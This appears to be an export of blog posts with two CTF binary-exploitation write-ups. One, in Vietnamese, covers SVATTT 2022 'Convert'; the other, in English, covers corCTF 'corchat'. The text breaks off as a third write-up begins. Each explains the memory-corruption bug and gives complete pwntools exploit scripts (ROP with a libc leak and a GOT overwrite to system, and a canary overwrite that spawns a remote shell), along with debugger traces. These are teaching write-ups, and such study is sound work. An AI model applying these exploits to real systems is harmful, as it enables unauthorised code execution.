[{"content":"Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).\nSau đây mình sẽ viết writeup về 1 bài pwn khá hay là Convert. Các binary với solve script mình sẽ để ở đây.\nConvert: Category: pwn Points: 498 Solves: 5 Description: Try my best! Overview $ file convert convert: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped $ checksec convert [*] \u0026#39;/home/pi/CTF/svattt/qual/pwn/convert/convert\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Đề bài cho file binary đã bị strip (sẽ tốn nhiều thời gian để reverse hơn). Binary bật bit NX với PIE.\nHàm main sau khi mình đã chỉnh lại:\nĐầu tiên chương trình gọi hàm setup và in ra địa chỉ return address của hàm =\u0026gt; Có được binary base.\nSau đó đọc input vào, input là 1 struct mình define như sau:\nstruct input { char ops[4]; char mode[4]; char data[48]; }; Tiếp theo thì allocate buffer cho biến p, có kiểu dữ liệu là 1 struct:\nstruct data { int ops; char mode[4]; char *data; struct data *next_data; }; Sau đó thì gọi hàm setup_data để gán data vào p.\nVà gọi hàm play_with_data.\nDựa vào mode thì sẽ vào hàm tương ứng, ở đây có 2 mode là hex_to_bin và bin_to_hex. Hai hàm này như tên gọi, cho phép ta chuyển đổi data từ hexadecimal sang binary và ngược lại.\nFinding the bug Trong hàm hex_to_bin, đầu tiên chương trình sẽ gọi hàm check:\nđể kiểm tra data có phải là 1 chuỗi hex không.\nSau đó, dựa vào p-\u0026gt;ops để tiếp tục chia ra thành các trường hợp.\nVới trường hợp p-\u0026gt;ops == 1, các node sẽ được liên kết bằng cách sử dụng singly linked list.\nCòn với trường hợp p-\u0026gt;ops == 0 thì sẽ traverse linked list để copy data vào mảng s.\nVà vấn đề xuất hiện từ đây, s là mảng 120 phần tử, nhưng ta cứ copy data từ các node vào mà không hề kiểm tra điều kiện, nên có thể gây ra lỗi stack buffer overflow.\nStack buffer overflow Mảng s nằm ở [rbp-0xc0] =\u0026gt; Ta cần 0xc8 bytes để tới được return address. Mình viết 1 POC để trigger lỗi xem có ghi đè được return address của hàm hex_to_bin không.\nfrom pwn import * elf = ELF(\u0026#39;./convert\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) p = process(\u0026#39;./convert\u0026#39;) def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b\u0026#39;\\x00\u0026#39;) sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ada print(hex(elf.address)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;a\u0026#39;*0x30) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;b\u0026#39;*0x30) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;c\u0026#39;*0x30) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;d\u0026#39;*0x30) send_data(0, b\u0026#39;htb\u0026#39;, b\u0026#39;e\u0026#39;*0x30) p.interactive() Ở đây mình có 0x30*5 = 0xf0 bytes, là đủ để ghi đè return address. Nhưng khi mình chạy thử thì:\npwndbg\u0026gt; Continuing. Program received signal SIGSEGV, Segmentation fault. 0x0000555555555519 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ──────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────── RAX 0x6363636363636363 (\u0026#39;cccccccc\u0026#39;) RBX 0x0 RCX 0x7fffffffde40 ◂— 0x6363636363636363 (\u0026#39;cccccccc\u0026#39;) RDX 0x30 RDI 0x7fffffffde40 ◂— 0x6363636363636363 (\u0026#39;cccccccc\u0026#39;) RSI 0x555555559380 ◂— \u0026#39;cccccccccccccccccccccccccccccccccccccccccccccccc\u0026#39; R8 0x1999999999999999 R9 0x555555559440 ◂— \u0026#39;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\u0026#39; R10 0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000 R11 0x7ffff7f96ce0 (main_arena+96) —▸ 0x555555559470 ◂— 0x0 R12 0x7fffffffe058 —▸ 0x7fffffffe39f ◂— \u0026#39;./convert\u0026#39; R13 0x555555555ac1 ◂— push rbp R14 0x0 R15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP 0x7fffffffdea0 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf40 ◂— 0x1 RSP 0x7fffffffdbf0 ◂— 0x0 RIP 0x555555555519 ◂— mov rax, qword ptr [rax + 0x10] ───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────── 0x55555555550c call memcpy@plt \u0026lt;memcpy@plt\u0026gt; 0x555555555511 add dword ptr [rbp - 0x2c], 0x30 0x555555555515 mov rax, qword ptr [rbp - 0x38] ► 0x555555555519 mov rax, qword ptr [rax + 0x10] 0x55555555551d test rax, rax 0x555555555520 je 0x555555555530 \u0026lt;0x555555555530\u0026gt; ↓ 0x555555555530 nop 0x555555555531 mov rax, qword ptr [rbp - 0x2a8] 0x555555555538 mov rax, qword ptr [rax + 8] 0x55555555553c mov rdi, rax 0x55555555553f call strlen@plt \u0026lt;strlen@plt\u0026gt; ────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdbf0 ◂— 0x0 01:0008│ 0x7fffffffdbf8 —▸ 0x555555559420 ◂— 0x62746800000000 02:0010│ 0x7fffffffdc00 ◂— 0x0 ... ↓ 5 skipped ──────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► f 0 0x555555555519 f 1 0x555555555a72 f 2 0x555555555b73 f 3 0x7ffff7da6d90 __libc_start_call_main+128 f 4 0x7ffff7da6e40 __libc_start_main+128 f 5 0x55555555510a ───────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; Chương trình lại crash ngay instruction mov rax, qword ptr [rax + 0x10]. Vậy chuyện gì đã xảy ra? Instruction đó ở ngay câu lệnh if ( !j-\u0026gt;next_data ).\nNếu chúng ta xem lại vị trí các biến trong hàm hex_to_bin, thì [rbp-0x38] sẽ là vị trí của j. Có nghĩa là mình đã vô tình ghi đè j thành 1 giá trị rác. Vậy giờ mình chỉ cần thay j thành 1 giá trị hợp lý là được.\nfrom pwn import * elf = ELF(\u0026#39;./convert\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) p = process(\u0026#39;./convert\u0026#39;) def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b\u0026#39;\\x00\u0026#39;) sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ada print(hex(elf.address)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;a\u0026#39;*0x30) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;b\u0026#39;*0x30) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;c\u0026#39;*8 + p64(0)*4 + p64(elf.address + 0x4070)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;d\u0026#39;*0x30) send_data(0, b\u0026#39;htb\u0026#39;, b\u0026#39;e\u0026#39;*0x30) p.interactive() Lần này thì chương trình sẽ crash ngay tại hàm memcpy.\n──────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────── RAX 0x555555559320 ◂— \u0026#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026#39; RBX 0x0 RCX 0x800061613f71 RDX 0x30 *RDI 0x800061613f71 RSI 0x555555559320 ◂— \u0026#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026#39; R8 0x1999999999999999 R9 0x555555559440 ◂— \u0026#39;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\u0026#39; R10 0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000 R11 0x7ffff7f96ce0 (main_arena+96) —▸ 0x555555559470 ◂— 0x0 R12 0x7fffffffe058 —▸ 0x7fffffffe39f ◂— \u0026#39;./convert\u0026#39; R13 0x555555555ac1 ◂— push rbp R14 0x0 R15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP 0x7fffffffdea0 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf40 ◂— 0x1 RSP 0x7fffffffdbf0 ◂— 0x0 *RIP 0x55555555550c ◂— call 0x555555555090 ───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────── 0x5555555554f7 lea rcx, [rbp - 0xc0] 0x5555555554fe add rcx, rdx 0x555555555501 mov edx, 0x30 0x555555555506 mov rsi, rax 0x555555555509 mov rdi, rcx ► 0x55555555550c call memcpy@plt \u0026lt;memcpy@plt\u0026gt; dest: 0x800061613f71 src: 0x555555559320 ◂— \u0026#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026#39; n: 0x30 0x555555555511 add dword ptr [rbp - 0x2c], 0x30 0x555555555515 mov rax, qword ptr [rbp - 0x38] 0x555555555519 mov rax, qword ptr [rax + 0x10] 0x55555555551d test rax, rax 0x555555555520 je 0x555555555530 \u0026lt;0x555555555530\u0026gt; ────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdbf0 ◂— 0x0 01:0008│ 0x7fffffffdbf8 —▸ 0x555555559420 ◂— 0x62746800000000 02:0010│ 0x7fffffffdc00 ◂— 0x0 ... ↓ 5 skipped ──────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► f 0 0x55555555550c f 1 0x555555555a72 f 2 0x555555555b73 f 3 0x7ffff7da6d90 __libc_start_call_main+128 f 4 0x7ffff7da6e40 __libc_start_main+128 f 5 0x55555555510a ───────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; Chương trình crash vì mình cũng đã ghi đè biến idx nằm ở [rbp-0x2c] thành 1 giá trị rác. Vậy mình cũng cần phải chỉnh lại giá trị của idx.\nfrom pwn import * elf = ELF(\u0026#39;./convert\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) p = process(\u0026#39;./convert\u0026#39;) def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b\u0026#39;\\x00\u0026#39;) sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ada print(hex(elf.address)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;a\u0026#39; + b\u0026#39;\\x00\u0026#39;*3 + p32(0xc0 - 0x30)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;b\u0026#39;*0x30) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;c\u0026#39;*8 + p64(0)*4 + p64(elf.address + 0x4070)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;d\u0026#39;*0x30) send_data(0, b\u0026#39;htb\u0026#39;, b\u0026#39;e\u0026#39;*0x30) p.interactive() Lúc này thì mình đã có thể điều khiển được luồng thực thi của chương trình.\n──────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────── RAX 0x0 RBX 0x0 RCX 0x7ffff7e91a37 (write+23) ◂— cmp rax, -0x1000 /* \u0026#39;H=\u0026#39; */ RDX 0x1 RDI 0x7ffff7f98a70 (_IO_stdfile_1_lock) ◂— 0x0 RSI 0x1 R8 0x4 R9 0x555555559440 ◂— \u0026#39;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\u0026#39; R10 0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000 R11 0x246 R12 0x7fffffffe058 —▸ 0x7fffffffe39f ◂— \u0026#39;./convert\u0026#39; R13 0x555555555ac1 ◂— push rbp R14 0x0 R15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP 0x6262626262626262 (\u0026#39;bbbbbbbb\u0026#39;) RSP 0x7fffffffdea8 ◂— \u0026#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc\u0026#39; RIP 0x5555555556aa ◂— ret ───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────── 0x555555555685 call puts@plt \u0026lt;puts@plt\u0026gt; 0x55555555568a jmp 0x5555555556a2 \u0026lt;0x5555555556a2\u0026gt; ↓ 0x5555555556a2 mov eax, dword ptr [rbp - 0x14] 0x5555555556a5 mov rbx, qword ptr [rbp - 8] 0x5555555556a9 leave ► 0x5555555556aa ret \u0026lt;0x6262626262626262\u0026gt; ────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdea8 ◂— \u0026#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc\u0026#39; ... ↓ 4 skipped 05:0028│ 0x7fffffffded0 ◂— \u0026#39;cccccccc\u0026#39; 06:0030│ 0x7fffffffded8 ◂— 0x0 07:0038│ 0x7fffffffdee0 ◂— 0x0 ──────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► f 0 0x5555555556aa f 1 0x6262626262626262 f 2 0x6262626262626262 f 3 0x6262626262626262 f 4 0x6262626262626262 f 5 0x6262626262626262 f 6 0x6363636363636363 f 7 0x0 ───────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; Overwrite GOT Tới đây thì có nhiều hướng, mình chọn cách leak libc rồi overwrite atoi@GOT thành system.\nSau khi leak được libc thì mình return về địa chỉ binary base + 0x1aff\nđể ghi đè GOT.\nFinal script from pwn import * elf = ELF(\u0026#39;./convert\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) p = process(\u0026#39;./convert\u0026#39;) def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b\u0026#39;\\x00\u0026#39;) sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ada print(hex(elf.address)) pop_rdi = elf.address + 0x1c0b pop_rbp_r14_r15 = elf.address + 0x1c07 send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;a\u0026#39; + b\u0026#39;\\x00\u0026#39;*3 + p32(0xc0 - 0x30)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;b\u0026#39; + b\u0026#39;\\x00\u0026#39;*7 + p64(pop_rdi) + p64(elf.got[\u0026#39;puts\u0026#39;]) + p64(elf.sym[\u0026#39;puts\u0026#39;]) + p64(pop_rbp_r14_r15) + p64(elf.got[\u0026#39;memcpy\u0026#39;] + 0x50)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;c\u0026#39;*8 + p64(0) + p64(pop_rdi + 1) + p64(elf.address + 0x1aff) + p64(0) + p64(elf.address + 0x4070)) send_data(1, b\u0026#39;htb\u0026#39;, b\u0026#39;d\u0026#39;*0x30) send_data(0, b\u0026#39;htb\u0026#39;, b\u0026#39;e\u0026#39;*0x30) libc.address = u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8, b\u0026#39;\\x00\u0026#39;)) - libc.sym[\u0026#39;puts\u0026#39;] print(hex(libc.address)) pause() p.send(b\u0026#39;/bin/sh\\x00\u0026#39; + p64(libc.sym[\u0026#39;malloc\u0026#39;]) + p64(libc.sym[\u0026#39;system\u0026#39;])) p.interactive() Do lúc mình viết writeup thì server đã đóng nên mình chỉ có thể test lại trên local.\n$ python3 solve.py [*] \u0026#39;/home/pi/CTF/svattt/qual/pwn/convert/convert\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [*] \u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./convert\u0026#39;: pid 27344 0x5562deef7000 0x7fde9a293000 [*] Paused (press any to continue) [*] Switching to interactive mode $ ls convert flag.txt gadgets.txt libc.so.6 solve.py $ cat flag.txt flag{test_flag} ","permalink":"https://pivik271.github.io/posts/ascisquals2022/","summary":"Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).\nSau đây mình sẽ viết writeup về 1 bài pwn khá hay là Convert. Các binary với solve script mình sẽ để ở đây.\nConvert: Category: pwn Points: 498 Solves: 5 Description: Try my best!","title":"Sơ khảo Sinh viên với An toàn thông tin 2022"},{"content":"I played corCTF last week with my team purf3ct and managed to solve 4 pwn challenges. Here are my writeups for some of them.\nAll of my exploit scripts can be found here.\ncorchat: Category: pwn Points: 334 Solves: 10 Description: Can you pwn our internal, terribly written, chat program? Overview The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:\nSET_UNAME: set your username. GET_UNAME: get your username. _SEND_MSG: send your message. GETSTATUS: execute top -n 1 if you are admin. Digging into the source code After taking a deeper look into the source code, I found a bug in Crusader::RecvMessage() function.\nstd::string Crusader::RecvMessage() { std::string msg = \u0026#34;\u0026#34;; cor_msg_buf msg_buf; memset(msg_buf.buffer, \u0026#39;\\x00\u0026#39;, sizeof(msg_buf.buffer)); if (read(this-\u0026gt;m_sock_fd, \u0026amp;msg_buf.len, sizeof(msg_buf.len)) \u0026lt;= 0) return msg; if (msg_buf.len \u0026gt;= sizeof(msg_buf.buffer) || msg_buf.len == 0) return msg; if (read(this-\u0026gt;m_sock_fd, \u0026amp;msg_buf.flags, sizeof(msg_buf.flags)) \u0026lt;= 0) return msg; msg_buf.len -= sizeof(msg_buf.flags); if (msg_buf.len \u0026lt;= 0) return msg; if (read(this-\u0026gt;m_sock_fd, msg_buf.buffer, msg_buf.len) \u0026lt;= 0) return msg; msg_buf.buffer[msg_buf.len] = \u0026#39;\\x00\u0026#39;; msg += msg_buf.buffer; return msg; } Here msg_buf holds the struct cor_msg_buf data type.\ntypedef struct { char buffer[1024]; uint16_t flags; uint16_t len; } cor_msg_buf; As we can see, the type of msg_buf.len is uint16_t, which is an unsigned number, so the check below can never happen.\nstd::string Crusader::RecvMessage() ... msg_buf.len -= sizeof(msg_buf.flags); if (msg_buf.len \u0026lt;= 0) return msg; ... Since sizeof(msg_buf.flags) == 2, if we set msg_buf.len to 1, then after msg_buf.len -= sizeof(msg_buf.flags), msg_buf.len will become 0xffff, which leads to a buffer overflow.\nBOF Now we have a stack buffer overflow, but PIE is enabled and there\u0026rsquo;s also a stack canary, so if we want to build a rop chain, some leaks are required. Unfortunately, I can\u0026rsquo;t find any easy way to leak, so I chose to partial overwrite the return address of Crusader::RecvMessage().\nWith ASLR turned off, the return address is 0x55555555964f, searching around that address, I found out at address 0x555555559611 is a call to DoAdmin function. DoAdmin first argument is the command to be executed, and luckily when Crusader::RecvMessage() returns, RDI is now holding the address of our buffer. So we can execute arbitrary system command.\nHowever, before we can reach the return address, there\u0026rsquo;s one more thing we need to resolve, which is stack canary. As I mentioned earlier, I didn\u0026rsquo;t see anything could be used for leaking. But looking again at the source code, we can see a new thread is spawned to call ChatServer::RecvCrusaderMessages function.\nvoid ChatServer::MainLoop() { int8_t new_socket, new_crusader_idx; std::string welcome_msg; pthread_t tid; pthread_create(\u0026amp;tid, NULL, \u0026amp;ChatServer::RecvCrusaderMessages, this); ... The interesting part about threaded function is that the Thread Local Storage (TLS) will be located near the thread stack. You can read more about TLS here. So if we have enough overflow, we can overwrite the master canary.\ndef send_msg(msglen, flags, msg): payload = b\u0026#39;_SEND_MSG\u0026#39; payload += p16(msglen) payload += p16(flags) payload += msg p.send(payload) payload = b\u0026#39;a\u0026#39;*0x408 payload += b\u0026#39;b\u0026#39;*8\t# stack canary payload += b\u0026#39;a\u0026#39;*0x18 payload += b\u0026#39;c\u0026#39;*8\t# return address payload = payload.ljust(0xd78, b\u0026#39;\\x00\u0026#39;) payload += b\u0026#39;b\u0026#39;*8\t# overwritten master canary send_msg(1, 1, payload) *RAX 0x0 RBX 0x0 RCX 0x555555571ed0 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaacccccccc\u0026#39; RDX 0x10 RDI 0x555555571ac0 ◂— 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) RSI 0x7ffff7a27dd0 ◂— \u0026#39;aaaaaaaacccccccc\u0026#39; R8 0xffffffffffffffe0 R9 0x7ffff7d69e70 (main_arena+752) —▸ 0x7ffff7d69e60 (main_arena+736) —▸ 0x7ffff7d69e50 (main_arena+720) —▸ 0x7ffff7d69e40 (main_arena+704) —▸ 0x7ffff7d69e30 (main_arena+688) ◂— ... R10 0x7ffff00008d0 ◂— 0x0 R11 0x555555571ac0 ◂— 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) R12 0xa R13 0x0 R14 0xa R15 0x0 RBP 0x7ffff7a27dd0 ◂— \u0026#39;aaaaaaaacccccccc\u0026#39; RSP 0x7ffff7a27990 —▸ 0x555555571a60 ◂— 0x0 *RIP 0x55555555a208 (Crusader::RecvMessage[abi:cxx11]()+466) ◂— je 0x55555555a20f ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x55555555a1a2 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+364\u0026gt; mov rdi, rax 0x55555555a1a5 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+367\u0026gt; call 0x5555555576d0 \u0026lt;0x5555555576d0\u0026gt; 0x55555555a1aa \u0026lt;Crusader::RecvMessage[abi:cxx11]()+372\u0026gt; jmp Crusader::RecvMessage[abi:cxx11]()+453 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+453\u0026gt; ↓ 0x55555555a1fb \u0026lt;Crusader::RecvMessage[abi:cxx11]()+453\u0026gt; mov rax, qword ptr [rbp - 0x18] 0x55555555a1ff \u0026lt;Crusader::RecvMessage[abi:cxx11]()+457\u0026gt; xor rax, qword ptr fs:[0x28] ► 0x55555555a208 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+466\u0026gt; ✔ je Crusader::RecvMessage[abi:cxx11]()+473 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+473\u0026gt; ↓ 0x55555555a20f \u0026lt;Crusader::RecvMessage[abi:cxx11]()+473\u0026gt; mov rax, qword ptr [rbp - 0x438] 0x55555555a216 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+480\u0026gt; add rsp, 0x438 0x55555555a21d \u0026lt;Crusader::RecvMessage[abi:cxx11]()+487\u0026gt; pop rbx 0x55555555a21e \u0026lt;Crusader::RecvMessage[abi:cxx11]()+488\u0026gt; pop rbp 0x55555555a21f \u0026lt;Crusader::RecvMessage[abi:cxx11]()+489\u0026gt; ret ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffff7a27990 —▸ 0x555555571a60 ◂— 0x0 01:0008│ 0x7ffff7a27998 —▸ 0x7ffff7a27e90 —▸ 0x555555571ac0 ◂— 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) 02:0010│ 0x7ffff7a279a0 ◂— 0x0 03:0018│ 0x7ffff7a279a8 ◂— 0x0 04:0020│ 0x7ffff7a279b0 ◂— 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) ... ↓ 3 skipped ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x55555555a208 Crusader::RecvMessage[abi:cxx11]()+466 f 1 0x6363636363636363 f 2 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; Another problem? Now we can bypass canary. But here comes another problem.\nRAX 0x7ffff7a27e90 —▸ 0x555555571ac0 ◂— 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) RBX 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) RCX 0x555555571ed0 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaacccccccc\u0026#39; RDX 0x10 RDI 0x555555571ac0 ◂— 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) RSI 0x7ffff7a27dd0 ◂— \u0026#39;aaaaaaaacccccccc\u0026#39; R8 0xffffffffffffffe0 R9 0x7ffff7d69e70 (main_arena+752) —▸ 0x7ffff7d69e60 (main_arena+736) —▸ 0x7ffff7d69e50 (main_arena+720) —▸ 0x7ffff7d69e40 (main_arena+704) —▸ 0x7ffff7d69e30 (main_arena+688) ◂— ... R10 0x7ffff00008d0 ◂— 0x0 R11 0x555555571ac0 ◂— 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) R12 0xa R13 0x0 R14 0xa R15 0x0 *RBP 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) *RSP 0x7ffff7a27dd8 ◂— \u0026#39;cccccccc\u0026#39; *RIP 0x55555555a21f (Crusader::RecvMessage[abi:cxx11]()+489) ◂— ret ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x55555555a208 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+466\u0026gt; je Crusader::RecvMessage[abi:cxx11]()+473 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+473\u0026gt; ↓ 0x55555555a20f \u0026lt;Crusader::RecvMessage[abi:cxx11]()+473\u0026gt; mov rax, qword ptr [rbp - 0x438] 0x55555555a216 \u0026lt;Crusader::RecvMessage[abi:cxx11]()+480\u0026gt; add rsp, 0x438 0x55555555a21d \u0026lt;Crusader::RecvMessage[abi:cxx11]()+487\u0026gt; pop rbx 0x55555555a21e \u0026lt;Crusader::RecvMessage[abi:cxx11]()+488\u0026gt; pop rbp ► 0x55555555a21f \u0026lt;Crusader::RecvMessage[abi:cxx11]()+489\u0026gt; ret \u0026lt;0x6363636363636363\u0026gt; ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffff7a27dd8 ◂— \u0026#39;cccccccc\u0026#39; 01:0008│ 0x7ffff7a27de0 ◂— 0x0 ... ↓ 6 skipped ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x55555555a21f Crusader::RecvMessage[abi:cxx11]()+489 f 1 0x6363636363636363 f 2 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; As you can see, we have to overwrite full 8 bytes of the return address in order to reach the master canary. Again, we don\u0026rsquo;t have any leaks, so this is probably not what we expect.\nIf we notice, msg_buf.buffer is at [rbp - 0x420] and msg_buf.len is at [rbp - 0x1e], which means we can overwrite msg_buf.len to a controlled value.\nstd::string Crusader::RecvMessage() ... msg_buf.buffer[msg_buf.len] = \u0026#39;\\x00\u0026#39;; msg += msg_buf.buffer; ... My approach is to overwrite the master canary one byte at a time. After 7 times, we can change canary to 0 without having to touch the return address.\nFinal script from pwn import * # p = remote(\u0026#39;localhost\u0026#39;, 9999) p = remote(\u0026#39;pwn-corchat-b293bf49f31ff8e3.be.ax\u0026#39;, 1337, ssl=True) def send_msg(msglen, flags, msg): payload = b\u0026#39;_SEND_MSG\u0026#39; payload += p16(msglen) payload += p16(flags) payload += msg p.send(payload) for i in range(1, 8): payload = b\u0026#39;a\u0026#39;*0x402 payload += p16(i + 0xd78) payload += b\u0026#39;\\x00\u0026#39;*4 payload += b\u0026#39;\\x00\u0026#39;*(i + 1) sleep(0.5) send_msg(1, 1, payload) cmd = b\u0026#39;/bin/bash 0\u0026gt;\u0026amp;4 1\u0026gt;\u0026amp;4 2\u0026gt;\u0026amp;4\u0026#39; payload = cmd payload += b\u0026#39;;\u0026#39; payload = payload.ljust(0x402, b\u0026#39;a\u0026#39;) payload += p16(0x420) payload += b\u0026#39;\\x00\u0026#39;*4 payload += p64(0)*4 payload += b\u0026#39;\\x11\u0026#39; sleep(0.5) send_msg(1, 1, payload) p.interactive() $ python3 solve.py [+] Opening connection to pwn-corchat-b293bf49f31ff8e3.be.ax on port 1337: Done [*] Switching to interactive mode Welcome to CoRChat! $ id uid=1000(ctf) gid=1000(ctf) groups=1000(ctf) $ ls corchat_server flag.txt $ cat flag.txt corctf{pThr34D_g03s_brrrr} nbd: Category: pwn Points: 362 Solves: 8 Description: You pwned the server in 4th Real World CTF, can you pwn the client now? I didn\u0026rsquo;t work on this challenge until my teammate 